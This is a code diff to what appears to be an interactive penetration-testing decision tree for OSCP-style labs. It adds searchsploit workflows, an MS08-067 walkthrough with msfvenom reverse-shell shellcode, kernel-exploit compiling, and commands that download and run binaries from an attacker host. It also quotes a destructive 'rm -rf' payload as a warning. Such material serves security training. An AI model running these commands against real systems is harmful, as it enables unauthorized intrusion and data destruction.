@@ -618,7 +618,17 @@ nmap -p <PORT> -sC -sV --version-intensity 9 $ip
 # 2181          — ZooKeeper
 # 4848          — GlassFish admin
 
-searchsploit $(nmap -p <PORT> -sV $ip | grep open | awk '{print $3,$4}')`,
+# ── AUTO-SEARCHSPLOIT FROM BANNER ────────
+# Most reliable — let nmap get the version then pipe straight to searchsploit:
+searchsploit $(nmap -p <PORT> -sV $ip | grep open | awk '{print $3,$4}')
+
+# Example output if port 21 is ProFTPD 1.3.5:
+# → searchsploit ProFTPD 1.3.5
+# Use this pattern for ANY unknown port — nmap identifies, searchsploit hunts
+
+# Or use the XML method (catches all ports at once):
+nmap -p <PORT> -sV $ip -oX service.xml
+searchsploit --nmap service.xml`,
     warn: null,
     choices: [
       { label: "Tomcat / JBoss / Java app server", next: "tomcat" },
@@ -1526,6 +1536,7 @@ nmap -p 3389 --script rdp-vuln-ms12-020 $ip`,
     choices: [
       { label: "Got RDP access — Windows foothold", next: "windows_post_exploit" },
       { label: "Need creds first", next: "bruteforce" },
+      { label: "Got RDP/Windows version — searchsploit it", next: "searchsploit_web" },
       { label: "BlueKeep vulnerable — searchsploit", next: "searchsploit_web" },
     ],
   },
@@ -2795,18 +2806,31 @@ nmap -p80,443 --script=http-methods $ip \\
     body: "Run scripts and version detection only on discovered ports. This is your core recon. Read every line of output.",
     cmd: `# ── GREP OPEN PORTS FROM ALLPORTS SCAN ───
 # Pull port numbers directly from allports.txt — paste straight into targeted scan
-grep -oP '^[0-9]+(?=/tcp\s+open)' scans/allports.txt | tr '\n' ',' | sed 's/,$//'
+grep -oP '^[0-9]+(?=/tcp\s+open)' allports.txt | tr '\n' ',' | sed 's/,$//'
 # Output: 22,80,443,8080  ← copy this
 
 # One-liner: run targeted scan immediately after full scan
-ports=$(grep -oP '^[0-9]+(?=/tcp\s+open)' scans/allports.txt | tr '\n' ',' | sed 's/,$//') && \\
+ports=$(grep -oP '^[0-9]+(?=/tcp\s+open)' allports.txt | tr '\n' ',' | sed 's/,$//') && \\
   nmap -p$ports -sC -sV -O --reason $ip -oN targeted.txt
 
 # ── TARGETED SCAN ─────────────────────────
-nmap -p <PORTS> -sC -sV -O --reason $ip -oN targeted.txt`,
+nmap -p <PORTS> -sC -sV -O --reason $ip -oN targeted.txt
+
+# ── SEARCHSPLOIT EVERY VERSION IN ONE SHOT ──
+# Once targeted.txt is done — pipe nmap output directly into searchsploit
+# This hits every service version nmap detected in a single command:
+cat targeted.txt | grep "open" | awk '{print $4,$5}' | cut -d/ -f1 | \\
+  while read service; do echo "=== $service ==="; searchsploit $service 2>/dev/null | grep -v "No Results"; done
+
+# Or: searchsploit directly against the nmap XML output (cleanest method):
+nmap -p <PORTS> -sC -sV -O --reason $ip -oX targeted.xml -oN targeted.txt
+searchsploit --nmap targeted.xml
+# --nmap reads the XML and searches every detected service/version automatically
+# This is the OffSec-recommended workflow for initial exploit discovery`,
     warn: null,
     choices: [
       { label: "Help me read and prioritize this output", next: "analyze_output" },
+      { label: "Got a version number — searchsploit it now", next: "searchsploit_web" },
       { label: "Web (80 / 443 / 8080 / 8443)", next: "web_enum" },
       { label: "SMB (139 / 445)", next: "smb_enum" },
       { label: "FTP (21)", next: "ftp_enum" },
@@ -4393,27 +4417,114 @@ fetch('/api/admin/adduser', {
   },
 
   searchsploit_web: {
-    phase: "WEB",
-    title: "Searchsploit / CVE Hunt",
-    body: "Check every service version you found. ExploitDB, GitHub, Google. Read the exploit before running it — most need minor modification.",
-    cmd: `searchsploit <service> <version>
-searchsploit -m <id>   # copy to CWD
-searchsploit -x <id>   # read before using
-searchsploit --www <service>  # open in browser
+    phase: "RECON",
+    title: "Searchsploit — Find a Public Exploit",
+    body: "You have a version number. That is a gift. Every service version goes through searchsploit — no exceptions. This is the OffSec methodology: enumerate → get version → searchsploit → read code → copy → modify → fire. Do this for every service on every port. A version number on an obscure port has cracked more boxes than any fancy technique.",
+    cmd: `# ── STEP 1: SEARCH ───────────────────────
+# Use the service name and version — be specific first, broad if nothing found
+searchsploit <service> <version>
+searchsploit apache 2.4.49
+searchsploit openssh 7.2
+searchsploit proftpd 1.3.5
+searchsploit "qdPM 9.1"       # quote exact app names with spaces
 
-# Also check:
-# https://github.com/search?q=CVE-XXXX-YYYY
+# Broad search if specific returns nothing:
+searchsploit apache 2.4          # try minor version only
+searchsploit proftpd              # try service name only
+searchsploit smb microsoft        # try service + vendor
+
+# Exclude noise (PoC-only, DoS):
+searchsploit apache 2.4 --exclude="(PoC)|/dos/"
+
+# Search online (Exploit-DB in browser):
+searchsploit --www apache 2.4.49
+
+# Google operators as backup:
+# site:exploit-db.com "apache 2.4.49"
+# site:github.com "CVE-2021-41773" exploit
+# "service version" exploit site:packetstormsecurity.com
+
+# ── STEP 2: READ THE EXPLOIT FIRST ───────
+# -x opens the exploit in the terminal — READ IT before running anything
+searchsploit -x <EDB-ID>
+searchsploit -x 50944
+
+# What to look for when reading:
+# - What arguments does it take? (URL, user, pass, LHOST, LPORT)
+# - Does it need credentials? (check if you have them)
+# - What language? Python2 vs Python3 matters
+# - Does it upload a file? Where? (webroot path may need updating)
+# - Any suspicious system() calls on YOUR machine? (rm -rf style)
+# - Does it have a usage/help section at the top?
+
+# ── STEP 3: COPY TO WORKING DIRECTORY ────
+# -m copies to your current dir so you can modify it safely
+# Never modify the original in /usr/share/exploitdb/
+searchsploit -m <EDB-ID>
+searchsploit -m 50944
+searchsploit -m windows/remote/42031.py   # by path also works
+
+# ── STEP 4: MODIFY FOR YOUR TARGET ───────
+# Most exploits need at minimum:
+# - LHOST / LPORT updated to your tun0 IP and listener port
+# - Target IP / URL updated
+# - Python2 → Python3 fixes if needed
+
+# Check your tun0 IP:
+ip a show tun0 | grep "inet " | awk '{print $2}' | cut -d/ -f1
+
+# Common Python2 → Python3 fixes:
+# print "x"       → print("x")
+# raw_input()     → input()
+# urllib2         → urllib.request
+# httplib         → http.client
+
+# ── STEP 5: SET UP LISTENER FIRST ────────
+nc -nlvp $LPORT
+
+# ── STEP 6: FIRE ──────────────────────────
+python3 exploit.py
+python3 exploit.py -url http://$ip/ -u user@target.com -p password
+python exploit.py $ip 443   # some take positional args
+
+# If exploit errors — read the usage section again carefully
+# Run with python2 if python3 fails
+# Check if dependencies need installing: pip install <module> --break-system-packages
+
+# ── WHEN SEARCHSPLOIT RETURNS NOTHING ────
+# Don't stop — work outward from the version:
+
+# Try one version up and one down (banners can be wrong):
+searchsploit apache 2.4.50    # if you saw 2.4.49
+searchsploit apache 2.4.48
+
+# Try strict mode to cut false positives:
+searchsploit -s "ProFTPD 1.3.5"   # exact match only
+
+# Try just the service name (no version):
+searchsploit proftpd
+searchsploit vsftpd
+
+# Online sources when local DB has nothing:
+# https://www.exploit-db.com (search by app name)
 # https://packetstormsecurity.com
-# Google: "<service> <version> exploit site:github.com"
+# https://sploitus.com (aggregates Exploit-DB + GitHub + more)
+# Google: site:exploit-db.com "service version"
+# Google: site:github.com CVE-YEAR-XXXXX exploit
+# Google: "service version" exploit poc
 
-# Most Python exploits just need:
-python3 exploit.py $ip $LHOST $LPORT`,
-    warn: "Read every exploit before running it. Modify LHOST/LPORT, fix paths, test it.",
+# Version mismatch — exploit targets slightly different version:
+# Read the vulnerable code path — does the function still exist?
+# Check git history of the app if open source
+# Try it anyway — patch levels often don't close the exact vuln`,
+    warn: "READ THE CODE before running any public exploit. The 0pen0wn SSH exploit is the famous example — it decoded to 'rm -rf ~ /* 2>/dev/null &' and would wipe your Kali machine. This is not hypothetical. Searchsploit returns local results from /usr/share/exploitdb/ — run 'sudo apt update && sudo apt install exploitdb' before an engagement to make sure it's current. Never modify exploits in their original location — always -m to copy first.",
     choices: [
-      { label: "Found working exploit — got shell", next: "shell_upgrade" },
-      { label: "Service looks like custom app — try BOF", next: "bof" },
-      { label: "Can deliver files to user — client-side", next: "client_side" },
-      { label: "No exploit — back to brute force / creds", next: "bruteforce" },
+      { label: "Got shell — stabilize it", next: "shell_upgrade" },
+      { label: "Exploit needs credentials — go find them", next: "bruteforce" },
+      { label: "Nothing in searchsploit — widen the search", next: "searchsploit_web" },
+      { label: "Exploit needs modification — Python/C errors", next: "exploit_compile" },
+      { label: "Custom app — no public exploit exists", next: "bof" },
+      { label: "Can get user to click something — client-side", next: "client_side" },
     ],
   },
 
@@ -4423,9 +4534,9 @@ python3 exploit.py $ip $LHOST $LPORT`,
   smb_enum: {
     phase: "SMB",
     title: "SMB Enumeration",
-    body: "SMB is information-rich. Null session, guest access, share contents, user enumeration. EternalBlue check is mandatory.",
+    body: "SMB is information-rich. Null session, guest access, share contents, user enumeration. Always run smb-vuln* — MS17-010 and MS08-067 both show up on OSCP practice machines.",
     cmd: `# Full enum
-enum4linux-ng -A $ip | tee scans/smb_enum.txt
+enum4linux-ng -A $ip | tee smb_enum.txt
 
 # CME — null + guest
 crackmapexec smb $ip -u '' -p '' --shares
@@ -4436,12 +4547,15 @@ crackmapexec smb $ip -u '' -p '' --users
 smbclient -L //$ip -N
 smbclient //$ip/share -N
 
-# Vuln check
+# Vuln check — run both
 nmap --script smb-vuln* -p 445 $ip
-nmap --script smb-vuln-ms17-010 -p 445 $ip`,
+# MS17-010 = EternalBlue (Win 7 / Server 2008)
+# MS08-067 = NetAPI overflow (Win XP / Server 2003)`,
     warn: null,
     choices: [
+      { label: "Got SMB/Samba version — searchsploit it", next: "searchsploit_web" },
       { label: "MS17-010 / EternalBlue vulnerable", next: "eternalblue" },
+      { label: "MS08-067 vulnerable (XP / Server 2003)", next: "ms08_067" },
       { label: "Readable shares — download everything", next: "smb_loot" },
       { label: "Got usernames — brute force", next: "bruteforce" },
       { label: "Need creds to go further", next: "bruteforce" },
@@ -4474,6 +4588,58 @@ python3 eternalblue_exploit7.py $ip shellcode/sc_x86.bin`,
     choices: [
       { label: "Got SYSTEM shell!", next: "windows_post_exploit" },
       { label: "Exploit unstable — try manual MS17-010 PoC", next: "searchsploit_web" },
+    ],
+  },
+
+  ms08_067: {
+    phase: "SMB",
+    title: "MS08-067 — NetAPI Overflow",
+    body: "Remote code execution on Windows XP / Server 2003 via a crafted RPC request. Manual exploitation requires picking the correct target number for the exact OS version — wrong target crashes the machine. Identify the OS first from your nmap output, then match it to the exploit's target list.",
+    cmd: `# ── STEP 1: CONFIRM OS VERSION ───────────
+# From your targeted scan — look for:
+# Windows XP SP2, Windows XP SP3, Windows Server 2003 SP1/SP2
+# The exploit needs the exact version for correct shellcode offset
+
+# ── STEP 2: GET THE EXPLOIT ───────────────
+searchsploit ms08-067
+searchsploit -m 7132    # classic Python PoC
+# Or use the well-known manual PoC:
+# https://github.com/jivoi/pentest/blob/master/exploit_win/ms08-067.py
+
+# ── STEP 3: CHECK TARGET LIST ─────────────
+python ms08-067.py
+# Running with no args prints the target list:
+# 1  - Windows XP SP0/SP1 Universal
+# 2  - Windows XP SP2 English
+# 3  - Windows XP SP3 English
+# 6  - Windows 2003 SP0 Universal
+# 7  - Windows 2003 SP1 English
+# etc.
+# Match your OS version — wrong target = crash
+
+# ── STEP 4: GENERATE SHELLCODE ────────────
+# Replace the shellcode in the exploit with your own
+msfvenom -p windows/shell_reverse_tcp \\
+  LHOST=$LHOST LPORT=$LPORT \\
+  EXITFUNC=thread -b "\\x00\\x0a\\x0d\\x5c\\x5f\\x2f\\x2e\\x40" \\
+  -f py -v shellcode
+# -b flag: bad chars for MS08-067 — these MUST be excluded
+# EXITFUNC=thread keeps the service alive after exploitation
+
+# ── STEP 5: PATCH + FIRE ──────────────────
+# Open the exploit in a text editor
+# Replace the shellcode variable with your msfvenom output
+# Set listener:
+nc -nlvp $LPORT
+
+# Fire:
+python ms08-067.py $ip [TARGET_NUMBER] 445
+# Example: python ms08-067.py 192.168.184.10 6 445`,
+    warn: "Wrong target number = service crash and machine goes unresponsive — revert required. Always identify the exact OS SP level before firing. Bad chars for this exploit are specific: \x00\x0a\x0d\x5c\x5f\x2f\x2e\x40 — msfvenom must exclude all of them or the shellcode corrupts. EXITFUNC=thread is mandatory to keep the vulnerable service running after you get the shell.",
+    choices: [
+      { label: "Got SYSTEM shell!", next: "windows_post_exploit" },
+      { label: "Machine crashed — revert and try correct target", next: "ms08_067" },
+      { label: "Shellcode not executing — check bad chars", next: "ms08_067" },
     ],
   },
 
@@ -4550,6 +4716,7 @@ ftp> passive
 ftp> put shell.php`,
     warn: null,
     choices: [
+      { label: "Got FTP version — searchsploit it", next: "searchsploit_web" },
       { label: "Anonymous access — found interesting files", next: "smb_loot" },
       { label: "FTP writable + webroot accessible = shell", next: "reverse_shell" },
       { label: "Need creds", next: "bruteforce" },
@@ -4576,6 +4743,7 @@ nc -nv $ip 22
 ssh-user-enum.py -U /usr/share/seclists/Usernames/Names/names.txt -t $ip`,
     warn: "Brute forcing SSH without a targeted username list is almost never the path.",
     choices: [
+      { label: "Got SSH version — searchsploit it", next: "searchsploit_web" },
       { label: "Found web on non-standard port", next: "web_enum" },
       { label: "Got creds from elsewhere — SSH in", next: "linux_post_exploit" },
       { label: "Got SSH key", next: "ssh_key" },
@@ -4637,6 +4805,7 @@ rpcclient -U "" $ip
 showmount -e $ip`,
     warn: null,
     choices: [
+      { label: "Got service version — searchsploit it", next: "searchsploit_web" },
       { label: "Got usernames from SNMP/LDAP/RPC", next: "bruteforce" },
       { label: "SMTP open — enumerate users", next: "smtp_enum" },
       { label: "DNS — try zone transfer", next: "dns_enum" },
@@ -5366,23 +5535,66 @@ ssh -R 8080:127.0.0.1:8080 kali@$LHOST -N   # if you have SSH out`,
   kernel_exploit: {
     phase: "LINUX",
     title: "Kernel Exploit",
-    body: "Last resort — kernel exploits can crash the machine. Compile carefully, test, have a revert plan. DirtyCow is classic but notoriously unstable.",
-    cmd: `uname -r
+    body: "Last resort — kernel exploits can crash the machine. Compile carefully, transfer correctly, test. DirtyCow is classic but notoriously unstable. The compilation step is where most people fail — wrong arch, missing headers, or compiling on Kali instead of the target.",
+    cmd: `# ── STEP 1: IDENTIFY KERNEL + OS ─────────
+uname -a           # full kernel version string
+uname -r           # just the release number
 cat /etc/os-release
+cat /etc/issue
+arch               # x86_64 or i686 — must match compiled binary
 
+# ── STEP 2: SEARCHSPLOIT THE KERNEL ───────
 searchsploit linux kernel $(uname -r | cut -d'-' -f1)
 searchsploit linux privilege escalation
+searchsploit ubuntu $(lsb_release -r | awk '{print $2}')   # distro-specific
 
-# Common exploits by kernel:
-# DirtyCow     CVE-2016-5195   (2.6.22 – 4.8.3)
-# overlayfs    CVE-2015-1328   (Ubuntu 12.04/14.04/15.10)
-# Baron Samedit CVE-2021-3156  (sudo < 1.9.5p2)
-# Dirty Pipe   CVE-2022-0847   (5.8 – 5.16.11)
+# Common exploits by kernel version:
+# DirtyCow     CVE-2016-5195   kernel 2.6.22 – 4.8.3   (very common on OSCP)
+# overlayfs    CVE-2015-1328   Ubuntu 12.04/14.04/15.10
+# Baron Samedit CVE-2021-3156  sudo < 1.9.5p2 (any distro)
+# Dirty Pipe   CVE-2022-0847   kernel 5.8 – 5.16.11
+# PwnKit       CVE-2021-4034   pkexec (most Linux distros pre-2022)
 
-# Always compile on same arch as target
+# ── STEP 3: COPY + READ THE EXPLOIT ───────
+searchsploit -m <EDB-ID>
+# Read it — check: required compiler flags, dependencies, any hardcoded paths
+
+# ── STEP 4: COMPILE ───────────────────────
+# CRITICAL: compile for the TARGET architecture, not Kali
+# Check target arch first: uname -m (x86_64 or i686)
+
+# Standard C compile:
 gcc exploit.c -o exploit
-./exploit`,
-    warn: "Kernel exploits can destabilize the machine. Use as last resort. Have revert ready.",
+
+# If target is 32-bit and Kali is 64-bit (cross-compile):
+gcc -m32 exploit.c -o exploit
+
+# If exploit requires specific flags (read the source comments):
+gcc exploit.c -o exploit -pthread -lcrypt
+gcc exploit.c -o exploit -lpthread
+
+# Cross-compile for Windows from Kali:
+x86_64-w64-mingw32-gcc exploit.c -o exploit.exe          # 64-bit Windows
+i686-w64-mingw32-gcc exploit.c -o exploit.exe             # 32-bit Windows
+x86_64-w64-mingw32-gcc exploit.c -o exploit.exe -lws2_32  # if uses winsock
+
+# ── STEP 5: TRANSFER TO TARGET ────────────
+# Kali: python3 -m http.server 80
+# Target (Linux):
+wget http://$LHOST/exploit -O /tmp/exploit
+chmod +x /tmp/exploit
+/tmp/exploit
+
+# Target (Windows):
+certutil -urlcache -split -f http://$LHOST/exploit.exe C:\\Windows\\Temp\\exploit.exe
+C:\\Windows\\Temp\\exploit.exe
+
+# ── STEP 6: IF COMPILE FAILS ──────────────
+# Missing headers: apt install gcc-multilib (for -m32 support)
+# Missing lib: apt install libssl-dev / libcrypt-dev
+# Try compiling ON the target if gcc is available:
+# which gcc && gcc exploit.c -o /tmp/exploit`,
+    warn: "Kernel exploits can destabilize the machine — have revert ready before firing. Compile for the target arch: x86_64-w64-mingw32-gcc for Windows, -m32 flag for 32-bit Linux from a 64-bit Kali. The most common failure is compiling on Kali (64-bit) and running on a 32-bit target. Always check arch first with 'uname -m' or 'file /bin/ls'.",
     choices: [
       { label: "Kernel exploit worked — ROOT!", next: "got_root_linux" },
       { label: "Machine crashed — reverted and re-enumerate", next: "linux_post_exploit" },
@@ -5437,10 +5649,31 @@ whoami /priv
 #   SeDebugPrivilege              → attach to LSASS → mimikatz
 #   SeLoadDriverPrivilege         → load malicious driver
 
-# ── OS + PATCH LEVEL ──────────────────────
+# ── OS + PATCH LEVEL → SEARCHSPLOIT ──────
 systeminfo
 systeminfo | findstr /i "os name\|os version\|hotfix"
 wmic qfe get Caption,Description,HotFixID,InstalledOn   # installed patches
+
+# Feed systeminfo directly to windows-exploit-suggester:
+# Step 1: save systeminfo output to a file
+systeminfo > sysinfo.txt
+# Transfer sysinfo.txt to Kali, then:
+python3 windows-exploit-suggester.py --update   # update the MS bulletin DB
+python3 windows-exploit-suggester.py --database 2024-XX-XX-mssb.xls --systeminfo sysinfo.txt
+# Output: lists unpatched CVEs by severity — take each one to searchsploit
+
+# Searchsploit the OS + patch level directly:
+# Example output: "Windows Server 2012 R2 Build 9600"
+searchsploit "windows server 2012 r2"
+searchsploit "ms16-032"    # specific KB if you know it
+searchsploit "ms15-051"
+searchsploit "ms14-058"
+
+# Common Windows local privesc CVEs by OS:
+# Server 2008 / Win 7:   MS11-046, MS16-032, MS15-051
+# Server 2012 / Win 8:   MS16-032, MS15-051, MS14-058
+# Server 2016 / Win 10:  Token privesc usually beats kernel — check SeImpersonate first
+# Always try token privesc (GodPotato) BEFORE kernel exploits — less risky
 
 # ── NETWORK POSITION ──────────────────────
 ipconfig /all                  # all interfaces — look for second NIC
